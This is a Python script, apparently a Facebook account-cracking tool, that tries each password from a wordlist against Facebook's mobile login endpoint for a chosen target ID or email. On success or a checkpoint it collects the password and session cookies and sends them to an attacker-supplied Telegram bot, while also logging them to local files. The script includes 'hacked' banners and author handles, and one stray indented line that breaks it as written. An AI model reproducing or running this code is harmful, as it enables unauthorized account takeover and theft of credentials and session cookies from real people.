import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')

session = requests.session()
# Colors
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
Z1 = '\033[2;31m'  # Second red
F = '\033[2;32m'  # Green
A = '\033[2;34m'  # Blue
C = '\033[2;35m'  # Pink
B = '\x1b[38;5;208m'  # Orange
Y = '\033[1;34m'  # Light blue
M = '\x1b[1;37m'  # White
S = '\033[1;33m'
U = '\x1b[1;37m'  # White
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
#------------------colors---------------#
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
E = "\033[0;90m" #رمادي
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
#------------------logo---------------------#
token = input(f""+BWhite+" ⌯"+BGreen+" Send Your Token : \033[1;37m ")
ID = input(""+BWhite+" ⌯"+BGreen+" Send Your ID : \033[1;37m  ")
	print(f'{Bl}←•━━━━━━━━━━━━•→')



def sufi():
    email = input(f'{X}▄︻┻═┳一 𝖤𝗇𝗍𝖾𝗋 𝖨𝖣 𝗈𝗋 𝖤𝗆𝖺𝗂𝗅 : ')
    print(f'{M}_' *60)
    file = input(f'{A}▄︻┻═┳一 𝖤𝗇𝗍𝖾𝗋 𝖥𝗂𝗅𝖾 𝖯𝖺𝗌𝗌 : ')
    try:
        with open(file, "r") as f:
            for line in f:
                password = line.strip()
                cookies = {
                    'datr': 'eE3bZVRfHsuNzDgq4JoLFEad',
                    'sb': 'eE3bZT9cCTFBlSLzDqdpLl9C',
                    'ps_l': '0',
                    'ps_n': '0',
                    'dpr': '2.1988937854766846',
                    'wd': '891x1708',
                    'fr': '0XBKAAVB6DOFQgcPM..Bl5E-o..AAA.0.0.Bl6zF5.AWWvlxXPFKI',
                }

                headers = {
                    'authority': 'd.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '2',
                    'origin': 'https://d.facebook.com',
                    'referer': 'https://d.facebook.com/',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-ch-ua-platform-version': '""',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'viewport-width': '980',
                }

                params = {
                    'refsrc': 'deprecated',
                    'lwv': '100',
                    'refid': '8',
                }

                data = {
                    'lsd': 'AVqnyD4k3wA',
                    'jazoest': '2957',
                    'm_ts': '1710082815',
                    'li': '_8rtZcfvY5T7xCDXNKfGx2mJ',
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': email,
                    'pass': password,
                    'login': 'تسجيل الدخول',
                    'bi_xrwh': '0',
                }

                ahmed = session.post(
                    'https://d.facebook.com/login/device-based/regular/login/',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )

                if "c_user" in session.cookies.get_dict():
                    print(f'{F}𝖧𝖺𝖼𝗄𝖾𝖣 ➠ {email} & {password}')
                    cook = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                    tlg = f'''تعال ولك اكس جابلك الباسورد ✅ 
←•━━━━━━━━━━━━•→
🏆 𝙸𝙳 ➠ {email} 
🏆 𝙿𝚊𝚜𝚜 ➠ {password}
🏆 𝙲𝚘𝚘𝚔𝚒𝚎 ➠ {cook}
🏆 𝚄𝚛𝚕 ➠ https://www.facebook.com/profile.php?id={email}
←•━━━━━━━━━━━━•→
🚫 𝐁𝐘 » @DevEviI  - @C35CS'''
                    print(tlg)

                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Pass.txt', 'a') as x:
                        x.write(email + ":" + password + '\n' + tlg)
                elif "checkpoint" in session.cookies.get_dict():
                    print(f'{B}▄︻┻═┳一 𝖧𝖺𝖼𝗄𝖾𝗋 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 ➠ {email} & {password}')
                    cook = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                    tlg = (f'''تعال ولك اكس جابلك الباسورد ✅ 
←•━━━━━━━━━━━━•→
🏆 𝙸𝙳 ➠ {email} 
🏆 𝙿𝚊𝚜𝚜 ➠ {password}
🏆 𝙲𝚘𝚘𝚔𝚒𝚎 ➠ {cook}
🏆 𝚄𝚛𝚕 ➠ https://www.facebook.com/profile.php?id={email}
←•━━━━━━━━━━━━•→
🚫 𝐁𝐘 » @DevEviI - @C35CS''')
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Facebook Cp.txt', 'a') as x:
                        x.write(email + ":" + password + '\n')
                elif 'Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun' in session.cookies.get_dict() or 'The phone number or email you entered does not match any account' in session.cookies.get_dict() or 'الرقم الهاتفي أو البريد الإلكتروني الذي أدخلته لا يتطابق مع أي حساب' in session.cookies.get_dict() or 'Incorrect Email or password' in session.cookies.get_dict() or 'Incorrect Email' in session.cookies.get_dict() or 'Incorrect password' in session.cookies.get_dict() or 'Not Found Your Account' in session.cookies.get_dict():
                    print(f'{E}𝖡𝖺𝖣 ➠ {email} & {password}')
                else:
                    print(f'{E}𝖡𝖺𝖣 ➠ {email} & {password}')
    except FileNotFoundError:
        print(f'{E}𝖥𝗂𝗅𝖾 𝖭𝗈𝖳 𝖥𝗈𝗎𝗇𝖣.')
        sufi()

sufi()
